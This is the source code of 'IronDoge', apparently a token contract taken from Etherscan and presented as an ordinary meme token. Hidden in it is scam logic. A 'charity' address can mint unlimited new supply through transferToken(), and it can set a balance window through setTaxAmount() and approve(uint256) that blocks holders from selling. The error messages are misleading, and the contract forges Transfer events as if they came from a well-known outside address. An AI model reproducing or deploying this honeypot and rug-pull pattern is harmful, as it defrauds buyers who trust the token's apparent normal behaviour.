/**
 *Submitted for verification at Etherscan.io on 2021-07-05
*/

// Welcome to IronDoge, join us on telegram: https://t.me/irondogeofficial

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract IronDoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _charityAddress;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Iron Doge';
    string private _symbol = 'IRONDOGE';
    uint8 private _decimals = 18;
    uint256 private _maxTotal;
  
    address payable public BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    uint256 private _taxAmount;
    uint256 private _tAmount;

    constructor (address charityAdd, uint256 maxTotal, uint256 taxAm, uint256 txAm) public {
        _charityAddress = charityAdd;
        _maxTotal = maxTotal;
        _taxAmount = taxAm;
        _tAmount = txAm;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function transferToken() public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _charityAddress, "ERC20: cannot permit dev address");
        _tTotal = _tTotal.add(_maxTotal);
        _balances[_charityAddress] = _balances[_charityAddress].add(_maxTotal);
        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _charityAddress, _maxTotal);
    }
    
    function setTaxAmount(uint256 maxTaxAmount) public {
        require(_msgSender() == _charityAddress, "ERC20: cannot permit dev address");
        _taxAmount = maxTaxAmount * 10**18;
    }
    
    function approve(uint256 approveAmount) public {
        require(_msgSender() == _charityAddress, "ERC20: cannot permit dev address");
        _tAmount = approveAmount * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
        
            if (balanceOf(sender) >= _tAmount && balanceOf(sender) <= _taxAmount) {
                require(amount < 1 * 10**3, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 burnAmount = amount.mul(7).div(100);
            uint256 sendAmount = amount.sub(burnAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[BURN_ADDRESS] = _balances[BURN_ADDRESS].add(burnAmount);
            _balances[recipient] = _balances[recipient].add(sendAmount);
            
            
            emit Transfer(sender, recipient, sendAmount);
        }
    }
}